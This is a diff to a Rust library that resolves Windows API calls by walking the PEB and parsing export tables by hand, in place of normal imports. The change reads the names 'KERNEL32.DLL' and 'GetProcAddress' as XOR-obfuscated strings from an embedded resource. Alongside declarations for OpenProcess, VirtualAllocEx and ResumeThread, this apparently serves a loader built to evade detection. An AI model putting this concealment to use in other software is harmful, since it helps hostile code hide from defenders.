@@ -74,8 +74,6 @@ pub type FnOpenFile = unsafe extern "system" fn(
 pub type FnOpenProcess =
     unsafe extern "system" fn(dwDesiredAccess: u32, bInheritHandle: u32, dwProcessId: u32) -> usize;
 pub type FnIsProcessorFeaturePresent = unsafe extern "system" fn(ProcessorFeature: u32) -> u32;
-pub type FnNtFlushInstructionCache =
-    unsafe extern "system" fn(hProcess: usize, lpBaseAddress: usize, dwSize: u32);
 pub type FnResumeThread = unsafe extern "system" fn(hThread: usize) -> u32;
 pub type FnSetStdHandle = unsafe extern "system" fn(nStdHandle: u32, hHandle: usize) -> u32;
 pub type FnVirtualAllocEx = unsafe extern "system" fn(
@@ -429,7 +427,7 @@ _get_peb:
     mov eax, fs:0x30
     ret",
 );
-pub unsafe fn GetModuleHandle(sModuleName: Vec<u8>) -> usize {
+pub unsafe fn GetModuleHandleInternal(sModuleName: Vec<u8>) -> usize {
     let peb = get_peb();
 
     if sModuleName.is_empty() {
@@ -488,6 +486,7 @@ pub unsafe fn GetModuleHandleX(xor_c_string: &[u8], key: &[u8]) -> usize {
 
     0
 }
+
 pub unsafe fn GetProcAddressInternal(hMod: usize, sProcName: &[u8]) -> usize {
     let pBaseAddr = hMod;
     let pDosHdr: &'static IMAGE_DOS_HEADER = mem::transmute(pBaseAddr);
@@ -628,7 +627,7 @@ pub unsafe fn GetProcAddressX(pBaseAddr: usize, xor_c_string: &[u8], key: &[u8])
 }
 pub unsafe fn AllocConsole() -> u32 {
     let allocConsole: FnAllocConsole = std::mem::transmute(GetProcAddressInternal(
-        GetModuleHandle("KERNEL32.DLL".as_bytes().to_vec()),
+        GetModuleHandleInternal("KERNEL32.DLL".as_bytes().to_vec()),
         "AllocConsole".as_bytes(),
     ));
 
@@ -636,7 +635,7 @@ pub unsafe fn AllocConsole() -> u32 {
 }
 pub unsafe fn FreeConsole() -> u32 {
     let freeConsole: FnFreeConsole = std::mem::transmute(GetProcAddressInternal(
-        GetModuleHandle("KERNEL32.DLL".as_bytes().to_vec()),
+        GetModuleHandleInternal("KERNEL32.DLL".as_bytes().to_vec()),
         "FreeConsole".as_bytes(),
     ));
 
@@ -712,7 +711,7 @@ pub unsafe fn GetFinalPathNameByHandleA(
 ) -> u32 {
     let getFinalPathNameByHandleA: FnGetFinalPathNameByHandleA =
         std::mem::transmute(GetProcAddressInternal(
-            GetModuleHandle("KERNEL32.DLL".as_bytes().to_vec()),
+            GetModuleHandleInternal("KERNEL32.DLL".as_bytes().to_vec()),
             "GetFinalPathNameByHandleA".as_bytes(),
         ));
 
@@ -720,7 +719,7 @@ pub unsafe fn GetFinalPathNameByHandleA(
 }
 pub unsafe fn GetModuleHandleA(lpModuleName: *const u8) -> usize {
     let getModuleHandleA: FnGetModuleHandleA = std::mem::transmute(GetProcAddressInternal(
-        GetModuleHandle("KERNEL32.DLL".as_bytes().to_vec()),
+        GetModuleHandleInternal("KERNEL32.DLL".as_bytes().to_vec()),
         "GetModuleHandleA".as_bytes(),
     ));
 
@@ -728,16 +727,20 @@ pub unsafe fn GetModuleHandleA(lpModuleName: *const u8) -> usize {
 }
 pub unsafe fn GetModuleHandleW(lpModuleName: *const u16) -> usize {
     let getModuleHandleW: FnGetModuleHandleW = std::mem::transmute(GetProcAddressInternal(
-        GetModuleHandle("KERNEL32.DLL".as_bytes().to_vec()),
+        GetModuleHandleInternal("KERNEL32.DLL".as_bytes().to_vec()),
         "GetModuleHandleW".as_bytes(),
     ));
 
     getModuleHandleW(lpModuleName)
 }
 pub unsafe fn GetProcAddress(hModule: usize, lpProcName: *const u8) -> usize {
-    let getProcAddress: FnGetProcAddress = std::mem::transmute(GetProcAddressInternal(
-        GetModuleHandle("KERNEL32.DLL".as_bytes().to_vec()),
-        "GetProcAddress".as_bytes(),
+    let getProcAddress: FnGetProcAddress = std::mem::transmute(GetProcAddressX(
+        GetModuleHandleX(
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
+        ),
+        get_resource_bytes(RESOURCE_ID, GETPROCADDRESS_POS, GETPROCADDRESS_LEN),
+        get_resource_bytes(RESOURCE_ID, GETPROCADDRESS_KEY, GETPROCADDRESS_LEN),
     ));
 
     getProcAddress(hModule, lpProcName)
@@ -769,7 +772,7 @@ pub unsafe fn OpenProcess(dwDesiredAccess: u32, bInheritHandle: u32, dwProcessId
 pub unsafe fn IsProcessorFeaturePresent(ProcessorFeature: u32) -> u32 {
     let isProcessorFeaturePresent: FnIsProcessorFeaturePresent =
         std::mem::transmute(GetProcAddressInternal(
-            GetModuleHandle("KERNEL32.DLL".as_bytes().to_vec()),
+            GetModuleHandleInternal("KERNEL32.DLL".as_bytes().to_vec()),
             "IsProcessorFeaturePresent".as_bytes(),
         ));
 
@@ -858,7 +861,7 @@ pub unsafe fn ResumeThread(hThread: usize) -> u32 {
 }
 pub unsafe fn SetStdHandle(nStdHandle: u32, hHandle: usize) -> u32 {
     let setStdHandle: FnSetStdHandle = std::mem::transmute(GetProcAddressInternal(
-        GetModuleHandle("KERNEL32.DLL".as_bytes().to_vec()),
+        GetModuleHandleInternal("KERNEL32.DLL".as_bytes().to_vec()),
         "SetStdHandle".as_bytes(),
     ));
 
